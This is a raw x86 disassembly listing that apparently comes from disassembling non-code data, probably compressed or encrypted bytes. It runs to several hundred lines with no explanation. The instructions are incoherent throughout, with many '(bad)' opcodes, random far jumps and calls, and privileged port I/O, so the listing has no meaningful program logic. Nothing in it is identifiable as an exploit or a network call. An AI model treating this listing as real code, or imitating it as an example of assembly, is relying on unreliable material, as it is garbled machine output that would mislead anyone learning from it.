  41fc55:	push   eax
  41fc56:	inc    eax
  41fc57:	pop    ecx
  41fc58:	pop    ebx
  41fc59:	add    ch,cl
  41fc5b:	and    eax,0xa035e84c
  41fc60:	push   edx
  41fc61:	and    bh,dl
  41fc63:	cmp    DWORD PTR [esi+0x12],0xffffff86
  41fc67:	cli    
  41fc68:	or     cl,BYTE PTR [edi+0x7b72f65a]
  41fc6e:	mov    cl,0x17
  41fc70:	mov    ebp,0x5f7e69b0
  41fc75:	stc    
  41fc76:	rcr    BYTE PTR [ecx+0x54db12d2],0xdf
  41fc7d:	xor    BYTE PTR [esi+0x62],dl
  41fc80:	lea    esi,[edi]
  41fc82:	inc    edi
  41fc83:	std    
  41fc84:	cmp    cl,BYTE PTR [edx+0x36]
  41fc87:	push   ss
  41fc88:	inc    edi
  41fc89:	adc    al,0x18
  41fc8b:	dec    esi
  41fc8c:	or     al,0x75
  41fc8e:	push   0xffffff86
  41fc90:	mov    edx,0xedd81c04
  41fc95:	test   eax,0xa35a72bf
  41fc9a:	inc    edx
  41fc9b:	(bad)  
  41fc9c:	(bad)  
  41fc9d:	jb     0x41fc3b
  41fc9f:	mov    al,0x1b
  41fca1:	test   al,0x80
  41fca4:	pop    edi
  41fca5:	lods   eax,DWORD PTR ds:[esi]
  41fca6:	fwait
  41fca7:	popa   
  41fca8:	push   ss
  41fca9:	lock push cs
  41fcab:	cmp    al,0x3d
  41fcad:	pop    esi
  41fcae:	jg     0x41fcfd
  41fcb0:	lods   al,BYTE PTR ds:[esi]
  41fcb1:	rcr    BYTE PTR [ecx],cl
  41fcb3:	jae    0x41fcc9
  41fcb5:	push   esi
  41fcb6:	into   
  41fcb7:	outs   dx,DWORD PTR ds:[esi]
  41fcb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcb9:	jne    0x41fc48
  41fcbb:	xor    ch,BYTE PTR [esi]
  41fcbd:	aam    0x61
  41fcbf:	test   DWORD PTR [edi-0x12],esp
  41fcc2:	pop    ss
  41fcc3:	ja     0x41fc49
  41fcc5:	push   es
  41fcc6:	cmp    al,0x9d
  41fcc8:	jns    0x41fcce
  41fcca:	stos   BYTE PTR es:[edi],al
  41fccb:	loope  0x41fcda
  41fccd:	(bad)  
  41fcce:	hlt    
  41fccf:	fcom   QWORD PTR cs:[ecx+0x55]
  41fcd3:	sbb    BYTE PTR [ecx-0x311f0aae],0xfd
  41fcda:	imul   ebp,DWORD PTR ds:0x239ab969,0x74
  41fce1:	push   cs
  41fce2:	xchg   ecx,eax
  41fce3:	jb     0x41fc6d
  41fce5:	fnsave fs:0xf862a737
  41fcec:	cmc    
  41fced:	nop
  41fcee:	xor    eax,0x5e9941fd
  41fcf3:	xchg   BYTE PTR [esp+ecx*2+0x2d],bl
  41fcf7:	and    BYTE PTR [ebp-0x6c],0x8e
  41fcfb:	stos   BYTE PTR es:[edi],al
  41fcfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fcfd:	xchg   edi,eax
  41fcfe:	in     al,dx
  41fcff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd00:	and    dh,bh
  41fd02:	inc    eax
  41fd03:	ficomp WORD PTR [edx]
  41fd05:	mov    ecx,0x47601cd8
  41fd0a:	and    eax,0xbcf0740f
  41fd0f:	fnsave [esi]
  41fd11:	dec    ebx
  41fd12:	mov    ds:0xefbc9a06,al
  41fd17:	aam    0xdb
  41fd19:	dec    ebx
  41fd1a:	aam    0x15
  41fd1c:	retf   
  41fd1d:	or     eax,0xb937f55a
  41fd22:	mov    cl,0xb3
  41fd24:	and    DWORD PTR [edi-0x7e271ee1],esi
  41fd2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd2b:	xchg   DWORD PTR [eax],ebp
  41fd2d:	mov    DWORD PTR [ebp+0x5a],esp
  41fd30:	lds    ecx,FWORD PTR [ebp+0x4f13e477]
  41fd36:	inc    esi
  41fd37:	test   BYTE PTR [ebp+0x18],dl
  41fd3a:	adc    esp,esp
  41fd3c:	mov    dl,0x93
  41fd3e:	dec    esi
  41fd3f:	push   esp
  41fd40:	das    
  41fd41:	in     al,0x0
	...
  41fdb3:	add    BYTE PTR ds:0x7b197956,al
  41fdb9:	aas    
  41fdba:	gs pop esi
  41fdbc:	repnz lahf 
  41fdbe:	and    al,0x2d
  41fdc0:	xchg   ecx,eax
  41fdc1:	or     BYTE PTR [ebp-0x16],0xfa
  41fdc5:	push   ebp
  41fdc6:	add    DWORD PTR [eax],eax
  41fdc8:	test   BYTE PTR [eax],0x0
  41fdcb:	add    BYTE PTR [ebx-0x41061e0c],bh
  41fdd1:	add    dl,bl
  41fdd3:	sbb    DWORD PTR [eax-0x59],edi
  41fdd6:	inc    esi
  41fdd7:	das    
  41fdd8:	sbb    esi,ebx
  41fdda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fddb:	mov    bh,0x96
  41fddd:	dec    eax
  41fdde:	cmp    ah,ah
  41fde0:	xchg   BYTE PTR [ebp+0xa58309b],cl
  41fde6:	loope  0x41fe51
  41fde8:	(bad)  
  41fde9:	ja     0x41fd80
  41fdeb:	adc    dl,ah
  41fded:	fisubr WORD PTR [ebx+0x600572db]
  41fdf3:	dec    eax
  41fdf4:	sbb    ah,ah
  41fdf6:	push   0x6e21d8f0
  41fdfb:	cmp    eax,DWORD PTR [eax]
  41fdfd:	xchg   BYTE PTR [ecx-0x10b89111],bh
  41fe03:	call   0xfadcf3df
  41fe08:	in     al,dx
  41fe09:	fisub  DWORD PTR [ebx+0x3020f1d6]
  41fe0f:	and    DWORD PTR [eax],0xde34e9af
  41fe15:	mov    bl,BYTE PTR [edi+0x2ce6db6d]
  41fe1b:	ret    
  41fe1c:	mov    ecx,0x23cd01d0
  41fe21:	pop    es
  41fe22:	or     eax,0xbb4b3a42
  41fe27:	pop    edi
  41fe28:	mov    bh,0xf3
  41fe2a:	xchg   ebx,eax
  41fe2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe2c:	jns    0x41fe46
  41fe2e:	mov    esi,cs
  41fe30:	in     al,dx
  41fe31:	jne    0x41fde1
  41fe33:	and    eax,DWORD PTR [esi+0x1abc5ba9]
  41fe39:	or     eax,0xee240c88
  41fe3e:	xor    edi,DWORD PTR ds:0xe81d6eb6
  41fe44:	rcl    cl,cl
  41fe46:	and    al,0xdf
  41fe48:	(bad)
  41fe4c:	std    
  41fe4d:	mov    gs,WORD PTR [edx]
  41fe4f:	push   ecx
  41fe50:	ins    DWORD PTR es:[edi],dx
  41fe51:	pop    esi
  41fe52:	add    DWORD PTR ds:0xb3083c14,esi
  41fe58:	xor    BYTE PTR cs:[eax+0x7b6fc90a],al
  41fe5f:	inc    edx
  41fe60:	sar    DWORD PTR [ebp+0x78a0db4a],1
  41fe66:	aad    0x96
  41fe68:	pop    ss
  41fe69:	inc    ebp
  41fe6a:	nop
  41fe6b:	inc    ecx
  41fe6c:	fst    st(5)
  41fe6e:	adc    BYTE PTR [ebp+esi*8-0x4d],cl
  41fe72:	addr16 std 
  41fe74:	pop    ebp
  41fe75:	sbb    DWORD PTR [edx+0x8],ebp
  41fe78:	(bad)  
  41fe79:	outs   dx,BYTE PTR ds:[esi]
  41fe7a:	push   ds
  41fe7b:	xor    al,0xd8
  41fe7d:	pop    es
  41fe7e:	sbb    bh,BYTE PTR [ecx]
  41fe80:	ins    DWORD PTR es:[edi],dx
  41fe81:	retf   
  41fe82:	or     BYTE PTR [esi],cl
  41fe84:	jbe    0x41fe71
  41fe86:	push   es
  41fe87:	cmp    BYTE PTR [edi+ecx*8-0x7e],ch
  41fe8b:	pop    esp
  41fe8c:	inc    esp
  41fe8d:	sbb    eax,0x77d6f0e2
  41fe92:	sbb    al,0xb7
  41fe95:	push   edx
  41fe96:	dec    eax
  41fe97:	js     0x41fed9
  41fe99:	jae    0x41fe69
  41fe9b:	mov    ah,0xeb
  41fe9d:	or     dl,BYTE PTR [esi+0x52fe507f]
  41fea3:	call   0x63a2:0x5f25ed07
  41feaa:	jae    0x41fe32
  41feac:	mov    WORD PTR [ecx+0x3ac0cded],gs
  41feb2:	cwde   
  41feb3:	jge    0x41fec6
  41feb5:	xor    esp,esi
  41feb7:	dec    edi
  41feb8:	xchg   edx,eax
  41feb9:	jne    0x41fee1
  41febb:	bound  ebp,QWORD PTR [ecx-0x6679f069]
  41fec1:	push   es
	...
  41ff32:	add    BYTE PTR [eax],al
  41ff34:	mov    ecx,0xff25bf5d
  41ff39:	out    0xbb,eax
  41ff3b:	fisttp QWORD PTR [edi+0x7]
  41ff3e:	mov    WORD PTR [edi-0x7712ed89],?
  41ff44:	lock push esi
  41ff46:	add    DWORD PTR [eax],eax
  41ff48:	test   BYTE PTR [eax],0x0
  41ff4b:	add    BYTE PTR [eax+eax*2+0x327849d],ah
  41ff52:	fsubr  QWORD PTR [ecx-0x16]
  41ff55:	mov    WORD PTR [edi-0x26cc8555],ds
  41ff5b:	adc    al,BYTE PTR [ecx+0x61]
  41ff5e:	outs   dx,BYTE PTR ds:[esi]
  41ff5f:	dec    edi
  41ff60:	(bad)  
  41ff61:	ss jb  0x41ff83
  41ff64:	mov    bh,BYTE PTR [ebp-0xd23ccc1]
  41ff6a:	sub    BYTE PTR [esi+0x2c349ddd],bh
  41ff70:	or     DWORD PTR [ebx],ecx
  41ff72:	or     al,ah
  41ff74:	bound  esi,QWORD PTR [edx]
  41ff76:	stos   BYTE PTR es:[edi],al
  41ff77:	or     edi,DWORD PTR [ecx-0x6b]
  41ff7a:	cmc    
  41ff7b:	out    dx,al
  41ff7c:	sbb    BYTE PTR [ecx],ch
  41ff7e:	jp     0x41ff2e
  41ff80:	out    dx,eax
  41ff81:	or     eax,DWORD PTR [ecx+0x7a]
  41ff84:	inc    edi
  41ff85:	popa   
  41ff86:	pop    es
  41ff87:	add    BYTE PTR [edi-0x2c366cc],ch
  41ff8d:	sub    DWORD PTR [ebx-0x5e],ecx
  41ff90:	mov    ecx,0xf2e11c55
  41ff95:	pop    eax
  41ff96:	add    dl,al
  41ff98:	mov    esi,0xe04ef993
  41ff9d:	imul   eax,DWORD PTR [ecx-0x37d42f7a],0x1
  41ffa4:	clc    
  41ffa5:	xor    ebp,ebx
  41ffa7:	sub    DWORD PTR [esi+0x78],ecx
  41ffaa:	popf   
  41ffab:	push   ds
  41ffac:	ins    DWORD PTR es:[edi],dx
  41ffad:	aam    0x4b
  41ffaf:	xlat   BYTE PTR ds:[ebx]
  41ffb0:	and    eax,0x1f59ec63
  41ffb5:	shl    cl,1
  41ffb7:	stc    
  41ffb8:	sbb    bh,BYTE PTR [edx+0x1474aa45]
  41ffbe:	es cmp eax,0xfd9a5087
  41ffc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffc5:	ja     0x420041
  41ffc7:	xchg   edi,eax
  41ffc8:	(bad)
  41ffcb:	xor    ah,BYTE PTR [edi]
  41ffcd:	xchg   DWORD PTR [ebx+edi*1-0x43],ecx
  41ffd1:	das    
  41ffd2:	xor    DWORD PTR [ebx+0x17],edx
  41ffd5:	shl    cl,cl
  41ffd7:	and    eax,0xff6d42dd
  41ffdc:	pushf  
  41ffdd:	call   0xb558a1e5
  41ffe2:	(bad)  
  41ffe4:	repz fld QWORD PTR [ecx+0x611ea9c]
  41ffeb:	and    bh,BYTE PTR [eax-0x4caa41d1]
  41fff1:	xchg   DWORD PTR [edx+ebp*4],esp
  41fff4:	jmp    0xe4b3:0x6bbd2e35
  41fffb:	xchg   ebx,eax
  41fffc:	push   ebp
  41fffd:	adc    bl,BYTE PTR [edx-0x584d3839]
  420003:	call   0x69d4a8bc
  420008:	retf   0x24d7
  42000b:	maxps  xmm4,XMMWORD PTR [ebx+0x7898895e]
  420012:	in     eax,dx
  420013:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420015:	inc    ecx
  420016:	aam    0x2c
  420018:	jecxz  0x420048
  42001a:	sub    al,0x18
  42001c:	xor    esp,DWORD PTR [eax+0x6944fa09]
  420022:	jge    0x42005c
  420024:	sbb    ah,BYTE PTR [edx-0x29]
  420027:	mov    dh,0x82
  420029:	push   eax
  42002a:	out    dx,al
  42002b:	mov    dh,0x4
  42002d:	bound  ebp,QWORD PTR [ecx+eiz*1-0xf3df207]
  420034:	mov    ebp,0x4f02a526
  420039:	sbb    DWORD PTR [edx-0x5c34fd8],0x977d10
	...
  4200b3:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  4200b9:	mov    ebx,0xe891ffdf
  4200be:	arpl   WORD PTR [eax-0x4f522099],ax
  4200c4:	out    0x57,al
  4200c6:	add    DWORD PTR [eax],eax
  4200c8:	test   BYTE PTR [eax],0x0
  4200cb:	add    cl,al
  4200cd:	pop    ecx
  4200ce:	aas    
  4200cf:	rcr    DWORD PTR [eax-0x26],1
  4200d2:	pop    ebx
  4200d3:	xchg   di,ax
  4200d5:	pop    ecx
  4200d6:	mov    eax,ds:0x32aa236e
  4200db:	je     0x420112
  4200dd:	scas   eax,DWORD PTR es:[edi]
  4200de:	fisub  WORD PTR [eax-0x494b5894]
  4200e4:	icebp  
  4200e5:	xchg   ecx,eax
  4200e6:	les    edi,FWORD PTR [ecx]
  4200e8:	mov    ebx,0xf13d44fb
  4200ed:	xchg   DWORD PTR [ebx+0x4b02091f],ecx
  4200f3:	stos   DWORD PTR es:[edi],eax
  4200f4:	mov    cl,0x0
  4200f6:	sahf   
  4200f7:	bound  esi,QWORD PTR [ebx-0x75982232]
  4200fd:	outs   dx,BYTE PTR ds:[esi]
  4200fe:	mov    ah,0xab
  420100:	scas   eax,DWORD PTR es:[edi]
  420101:	sbb    ah,BYTE PTR [ecx]
  420103:	cmp    ebx,DWORD PTR [ebx+0x613a08cf]
  420109:	int3   
  42010a:	mov    ah,BYTE PTR [ebp+eax*4-0x37]
  42010e:	and    ecx,ebp
  420110:	lahf   
  420111:	sub    al,0xcc
  420113:	out    0x31,eax
  420115:	fcomp  QWORD PTR ss:[ebx-0x7e77a69a]
  42011c:	inc    ebp
  42011d:	mov    ecx,?
  42011f:	outs   dx,BYTE PTR ds:[esi]
  420120:	add    DWORD PTR ds:0x619e7a11,0xc329fdf5
  42012a:	push   edi
  42012b:	and    DWORD PTR [eax+eax*4-0x27c833c0],edx
  420132:	outs   dx,BYTE PTR ds:[esi]
  420133:	inc    edx
  420134:	sub    BYTE PTR [ebp+0x22],ah
  420137:	sub    al,0xd0
  420139:	xchg   esi,eax
  42013a:	adc    bh,cl
  42013c:	ins    DWORD PTR es:[edi],dx
  42013d:	cmp    al,0xf4
  42013f:	aam    0xb9
  420141:	lds    edx,FWORD PTR ds:0xfecc2b9e
  420147:	jb     0x4200d0
  420149:	xor    eax,0x30388548
  42014e:	jbe    0x420174
  420150:	mov    esi,0x18fe9c38
  420155:	jle    0x42018e
  420157:	mov    ebp,0x69a54abb
  42015c:	jmp    0x1c94557e
  420161:	lea    esi,[ebx+0x11]
  420164:	out    dx,al
  420165:	repz dec ecx
  420167:	fisub  DWORD PTR [eax]
  420169:	and    DWORD PTR [ebx-0x5d88e21f],ecx
  42016f:	ja     0x42010f
  420171:	cmp    eax,0x69a2bad6
  420176:	sub    edx,0x5b
  420179:	push   edx
  42017a:	outs   dx,DWORD PTR ds:[esi]
  42017b:	xchg   edi,eax
  42017c:	cmc    
  42017d:	bound  edi,QWORD PTR [ebx-0x77]
  420180:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420181:	dec    ecx
  420182:	cmc    
  420183:	push   edx
  420184:	push   eax
  420185:	add    eax,0x6c9ad36
  42018a:	xchg   ebp,eax
  42018b:	sahf   
  42018c:	mov    edi,DWORD PTR [eax+edi*4]
  42018f:	scas   eax,DWORD PTR es:[edi]
  420190:	dec    eax
  420191:	push   ebp
  420192:	mov    bl,0x4a
  420194:	mov    ds:0x5620a294,eax
  420199:	fld    DWORD PTR [edx+0x5faa30aa]
  42019f:	or     DWORD PTR [ecx-0x79],ebp
  4201a2:	icebp  
  4201a3:	push   eax
  4201a4:	sbb    ecx,0x89e45382
  4201aa:	and    al,0xff
  4201ac:	mov    esp,0xfb18d4c5
  4201b1:	out    dx,al
  4201b2:	mov    bh,ch
  4201b4:	mov    BYTE PTR [bx+si-0x3c2c],ah
  4201b9:	and    dl,BYTE PTR [esi+eax*2-0x78]
  4201bd:	cmc    
  4201be:	pop    esp
  4201bf:	lods   eax,DWORD PTR ds:[esi]
  4201c0:	pop    ds
  4201c1:	inc    ebx
	...
  420232:	add    BYTE PTR [eax],al
  420234:	push   ecx
  420235:	sbb    edi,edi
  420237:	jmp    si
  42023a:	fnstcw WORD PTR [edi]
  42023c:	mov    DWORD PTR ds:0x49e7d010,ebx
  420242:	retf   0xdc8b
  420245:	pop    eax
  420246:	add    DWORD PTR [eax],eax
  420248:	test   BYTE PTR [eax],0x0
  42024b:	add    BYTE PTR [eax],dl
  42024d:	cli    
  42024e:	mov    edx,0xf7f56b9a
  420253:	aad    0xdb
  420255:	ja     0x4201de
  420257:	cwde   
  420258:	arpl   WORD PTR [eax+0x3f25f0e8],dx
  42025e:	xchg   ecx,eax
  42025f:	enter  0x49bf,0x18
  420263:	jns    0x42025c
  420265:	xchg   esp,eax
  420266:	sbb    ah,BYTE PTR [ebx+ebp*2+0x7a924088]
  42026d:	jbe    0x420263
  42026f:	test   DWORD PTR [ebx-0x23],ebx
  420272:	xor    eax,0xf53a57c
  420277:	xchg   ch,dl
  420279:	xor    eax,0x756db20e
  42027e:	fadd   st(0),st
  420280:	xchg   ebx,eax
  420281:	push   edx
  420282:	push   eax
  420283:	lahf   
  420284:	fidivr WORD PTR [eax-0x7c69e2da]
  42028a:	in     eax,0xd6
  42028c:	sar    esi,0x53
  42028f:	xlat   BYTE PTR ds:[ebx]
  420290:	mov    BYTE PTR [ebp-0x62addb47],bh
  420296:	mov    esp,0x3774c9c0
  42029b:	out    dx,al
  42029c:	out    dx,al
  42029d:	lea    edi,[eax-0x24]
  4202a0:	mov    al,BYTE PTR [ebp-0x65a4db01]
  4202a6:	lods   eax,DWORD PTR ds:[esi]
  4202a7:	rol    BYTE PTR [ebp+0x3e],1
  4202aa:	jp     0x420260
  4202ac:	out    dx,eax
  4202ad:	cmp    ebx,DWORD PTR [edx+0x6f]
  4202b0:	into   
  4202b1:	daa    
  4202b2:	xor    eax,0x5f0dfcb0
  4202b7:	dec    esp
  4202b8:	push   ss
  4202b9:	in     eax,dx
  4202ba:	jp     0x420272
  4202bc:	je     0x4202d0
  4202be:	xchg   edi,eax
  4202bf:	lahf   
  4202c0:	lods   al,BYTE PTR ds:[esi]
  4202c1:	mov    ds:0x52d8bb3d,eax
  4202c6:	stc    
  4202c7:	lds    ebp,FWORD PTR [ebx+0x7ede55ad]
  4202cd:	lods   al,BYTE PTR ds:[esi]
  4202ce:	ret    0x9737
  4202d1:	push   cs
  4202d2:	popf   
  4202d3:	adc    BYTE PTR [esi+0x4d4629f4],ah
  4202d9:	(bad)  
  4202da:	in     al,dx
  4202db:	cs sbb al,0x13
  4202de:	mov    cl,0x98
  4202e0:	ss and eax,0x8638f3a3
  4202e6:	or     ebp,DWORD PTR [ecx]
  4202e8:	repnz or eax,0xe4a2b915
  4202ee:	ja     0x4202e9
  4202f0:	les    eax,FWORD PTR [eax]
  4202f2:	shr    BYTE PTR [edx+ebx*8+0x60a04260],0x88
  4202fa:	jg     0x420346
  4202fc:	sbb    edi,ecx
  4202fe:	cld    
  4202ff:	(bad)  
  420300:	fld    QWORD PTR [ebx]
  420302:	dec    ebx
  420303:	(bad)  
  420304:	int3   
  420305:	and    al,BYTE PTR [ecx]
  420307:	mul    eax
  420309:	push   es
  42030a:	aad    0x65
  42030c:	jecxz  0x420377
  42030e:	lahf   
  42030f:	add    al,ch
  420311:	jecxz  0x4202ab
  420313:	jp     0x42036d
  420315:	fsub   DWORD PTR [ebp-0x33]
  420318:	std    
  420319:	sti    
  42031a:	lock xor eax,0xdb13afe
  420320:	enter  0x8b73,0x27
  420324:	in     eax,dx
  420325:	out    0x5b,eax
  420327:	xor    dl,0xd6
  42032a:	arpl   WORD PTR [edx+0x4b4ed823],si
  420330:	pushf  
  420331:	mov    edx,0xe6ebc235
  420336:	fisub  WORD PTR [edi]
  420338:	mov    ch,0xb8
  42033a:	aam    0xd7
  42033c:	jle    0x4203b6
  42033e:	add    eax,0xde16d7
	...
  4203b3:	add    BYTE PTR [edi+eiz*8],bh
  4203b6:	imul   ebp,edi,0xfffffffb
  4203b9:	out    dx,eax
  4203ba:	mov    esp,0x889a5af7
  4203bf:	arpl   WORD PTR [esp+0x14],cx
  4203c3:	stc    
  4203c4:	rcr    BYTE PTR [ecx+0x1],cl
  4203c7:	add    dh,dh
  4203c9:	add    BYTE PTR [eax],al
  4203cb:	add    BYTE PTR [ebx+0x4b],cl
  4203ce:	aam    0xcf
  4203d0:	mov    edx,0xdad0174a
  4203d5:	mov    ecx,DWORD PTR [edi-0x239c4d4c]
  4203db:	repnz dec ebx
  4203dd:	mov    DWORD PTR [edx+ecx*1],eax
  4203e0:	cmc    
  4203e1:	aad    0x1e
  4203e3:	(bad)  
  4203e4:	sahf   
  4203e5:	lods   eax,DWORD PTR ds:[esi]
  4203e6:	cs jns 0x4203fe
  4203e9:	fmul   st(7),st
  4203eb:	or     DWORD PTR [ebx+0x44aae6e2],0x32
  4203f2:	sub    ch,BYTE PTR [edx-0x7d]
  4203f5:	test   eax,0xce966cda
  4203fa:	sbb    ebx,DWORD PTR [edx]
  4203fc:	cvttps2pi mm4,QWORD PTR [edx]
  4203ff:	stc    
  420400:	lock cmp BYTE PTR [esi-0x2f],dl
  420404:	mov    dl,ch
  420406:	jne    0x4203f1
  420408:	scas   eax,DWORD PTR es:[edi]
  420409:	mov    esp,0x2c6ca1e8
  42040e:	mov    eax,edi
  420410:	jae    0x4203ab
  420412:	pusha  
  420413:	fisubr DWORD PTR [ecx-0x8b0e449]
  420419:	and    DWORD PTR [esi+0x33ee4093],ebx
  42041f:	aad    0xd6
  420421:	cmp    eax,0x2d39ef09
  420426:	add    dh,BYTE PTR [edi+0x63073ba1]
  42042c:	xchg   esp,eax
  42042d:	pop    eax
  42042e:	xchg   si,ax
  420430:	mov    ch,0x8a
  420432:	push   ds
  420433:	cwde   
  420434:	mov    edx,DWORD PTR [esi+ebp*2]
  420437:	leave  
  420438:	fimul  WORD PTR [ecx]
  42043a:	add    BYTE PTR [ebx+0x14],0x76
  42043e:	test   ch,0x95
  420441:	aam    0x23
  420443:	mov    ecx,0x3afc4c3e
  420448:	mov    ds:0x4b9f164e,eax
  42044d:	sub    eax,0x339d63ee
  420452:	xor    eax,0xff7e44d7
  420457:	test   ah,cl
  420459:	xor    DWORD PTR [ebp+0x56],ebx
  42045c:	jmp    0x546e:0xf285be23
  420463:	and    esi,0xffffffea
  420466:	mov    esp,0xd853e9d
  42046b:	lods   al,BYTE PTR gs:[esi]
  42046d:	jns    0x420471
  42046f:	mov    eax,0x299a6d35
  420474:	inc    esi
  420475:	xor    DWORD PTR [edi-0x7b5b3e8],0xc12568a4
  42047f:	jno    0x420472
  420481:	cmp    DWORD PTR [ebp-0x39cf5401],0x5c
  420488:	xchg   ebx,eax
  420489:	push   esi
  42048a:	rcr    BYTE PTR [ebp-0x13a3f50b],1
  420490:	jns    0x420473
  420492:	push   esp
  420493:	clc    
  420494:	je     0x42041b
  420496:	and    eax,0x3e58beb6
  42049b:	iret   
  42049c:	sbb    eax,eax
  42049e:	adc    ecx,ebp
  4204a0:	mov    edi,0x36f2790f
  4204a5:	jp     0x4204a3
  4204a7:	call   0x528d:0xd8a3db8c
  4204ae:	ja     0x420442
  4204b0:	pop    edx
  4204b1:	aaa    
  4204b2:	pop    ds
  4204b3:	dec    ebx
  4204b4:	push   esi
  4204b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204b6:	jno    0x4204db
  4204b8:	mov    edx,0x81059f1a
  4204bd:	aas    
  4204be:	cwde   
  4204bf:	addr16 xchg edi,eax
  4204c1:	fadd   DWORD PTR [eax]
	...
  420533:	add    BYTE PTR [eax+0x34],bh
  420536:	add    bh,bl
  420538:	dec    esi
  420539:	(bad)  
  42053a:	stc    
  42053b:	mov    bh,0x14
  42053d:	clc    
  42053e:	add    al,0xe1
  420540:	addr16 stc 
  420542:	pop    ebp
  420543:	retf   0x5ac8
  420546:	add    DWORD PTR [eax],eax
  420548:	test   BYTE PTR [eax],0x0
  42054b:	add    BYTE PTR [eax-0x57],dl
  42054e:	and    edi,edi
  420550:	cdq    
  420551:	repz imul eax,DWORD PTR [ebx+edx*2+0x7fc8f3d9],0xfbe54990
  42055d:	xchg   ecx,eax
  42055e:	pop    edi
  42055f:	out    0x83,al
  420561:	jp     0x420531
  420563:	push   0x14bb43a9
  420568:	sbb    al,0x7d
  42056a:	jge    0x4205cd
  42056c:	add    DWORD PTR [ebx+0x59],eax
  42056f:	mov    bh,0x46
  420571:	jae    0x4204fd
  420573:	test   BYTE PTR [ebp-0x75],ch
  420576:	loop   0x420590
  420578:	lahf   
  420579:	ja     0x420501
  42057b:	sub    al,0xc1
  42057d:	or     eax,0x4fc5e7dd
  420582:	pop    ecx
  420583:	in     eax,0xf
  420585:	sub    eax,edi
  420587:	xchg   esi,eax
  420588:	scas   al,BYTE PTR es:[edi]
  420589:	cmp    al,0xcc
  42058b:	out    dx,al
  42058c:	pop    ebx
  42058d:	js     0x4205c3
  42058f:	sub    eax,0xe7a536c7
  420594:	dec    ebx
  420595:	inc    ebp
  420596:	mov    dl,0x3
  420598:	pushf  
  420599:	test   al,0xc6
  42059b:	lods   al,BYTE PTR ds:[esi]
  42059c:	xor    DWORD PTR [edi],ecx
  42059e:	test   al,0x8f
  4205a0:	pop    ss
  4205a1:	jne    0x42053f
  4205a3:	and    eax,0x8756faa2
  4205a8:	inc    edx
  4205a9:	sbb    BYTE PTR [ebp+0x75],ah
  4205ac:	lds    ebx,FWORD PTR [edi-0x29]
  4205af:	into   
  4205b0:	dec    edx
  4205b1:	and    al,0x33
  4205b3:	cmp    esp,DWORD PTR ds:0xeb5169a3
  4205b9:	sbb    BYTE PTR [eax-0x294c2fb2],ah
  4205bf:	rcr    BYTE PTR ds:0x517a8da6,cl
  4205c5:	enter  0xf615,0xf
  4205c9:	mov    al,0xc0
  4205cb:	inc    ecx
  4205cc:	mov    eax,0xe6874945
  4205d1:	xchg   esi,eax
  4205d2:	mov    bl,0x98
  4205d4:	xchg   esp,eax
  4205d5:	xor    eax,0xeec5fc8b
  4205da:	add    DWORD PTR [ebp+0x7c],eax
  4205dd:	outs   dx,DWORD PTR ds:[esi]
  4205de:	mov    WORD PTR [ebx-0x37],?
  4205e1:	jp     0x4205ad
  4205e3:	pop    eax
  4205e4:	mov    BYTE PTR ds:0x35fb4f19,cl
  4205ea:	sar    ebp,0x44
  4205ed:	push   esi
  4205ee:	aas    
  4205ef:	jmp    0xf8b7:0x68d0c4cd
  4205f6:	call   0x6095:0x4fcf86ba
  4205fd:	or     ebp,edi
  4205ff:	fidiv  WORD PTR [edx]
  420601:	icebp  
  420602:	icebp  
  420603:	and    BYTE PTR [esi],0xfb
  420606:	int3   
  420607:	dec    ebp
  420608:	sar    DWORD PTR [esi],0x38
  42060b:	pop    ds
  42060c:	cmp    DWORD PTR [ebx],edx
  42060e:	xor    eax,0x948d1dcc
  420613:	retf   
  420614:	int3   
  420615:	icebp  
  420616:	(bad)  
  420618:	out    0x78,eax
  42061a:	outs   dx,BYTE PTR ds:[esi]
  42061b:	cwde   
  42061c:	mov    WORD PTR [esi+0x44a60458],cs
  420622:	and    BYTE PTR [ecx+0x44],bh
  420625:	ficomp DWORD PTR [edi-0x72]
  420628:	xchg   BYTE PTR [esi+0x5e],bh
  42062b:	sbb    DWORD PTR [edx-0x31],0xb45fbdd1
  420632:	jbe    0x420685
  420634:	out    0x52,eax
  420636:	imul   esp,DWORD PTR [bx+di],0xffffff97
  42063a:	mov    esi,0x5b80097e
  42063f:	push   edx
  420640:	jle    0x420651
	...
  4206b2:	add    BYTE PTR [eax],al
  4206b4:	xchg   edx,eax
  4206b5:	cmp    al,0x23
  4206b7:	jle    0x420668
  4206b9:	jg     0x42069a
  4206bb:	cld    
  4206bc:	jo     0x4206a6
  4206be:	hlt    
  4206bf:	leave  
  4206c0:	mov    esi,0xbef12998
  4206c5:	pop    ebx
  4206c6:	add    DWORD PTR [eax],eax
  4206c8:	test   BYTE PTR [eax],0x0
  4206cb:	add    BYTE PTR [edx],dl
  4206cd:	repnz xchg ebx,eax
  4206cf:	adc    eax,0x32f01fb9
  4206d4:	xchg   ecx,eax
  4206d5:	mov    ch,0x8f
  4206d7:	je     0x4206f4
  4206d9:	push   ebx
  4206da:	add    BYTE PTR [edi-0x6ed8d7d3],bh
  4206e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206e1:	sbb    al,0x12
  4206e3:	pop    es
  4206e4:	rol    BYTE PTR [edi-0x3b],1
  4206e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206e8:	cmp    al,ch
  4206ea:	test   al,0x98
  4206ec:	int    0x7a
  4206ee:	fcom   DWORD PTR [edi+0x2bfd5412]
  4206f4:	dec    ebx
  4206f5:	jne    0x42070c
  4206f7:	(bad)  
  4206f8:	out    0xac,eax
  4206fa:	xchg   edi,eax
  4206fb:	cmc    
  4206fc:	sub    dl,BYTE PTR [esi]
  4206fe:	xor    eax,0xd480c99c
  420703:	inc    edi
  420704:	sub    eax,0x6fe96987
  420709:	jae    0x4206c5
  42070b:	out    dx,eax
  42070c:	xor    BYTE PTR [edx+0x3cb744a6],0xec
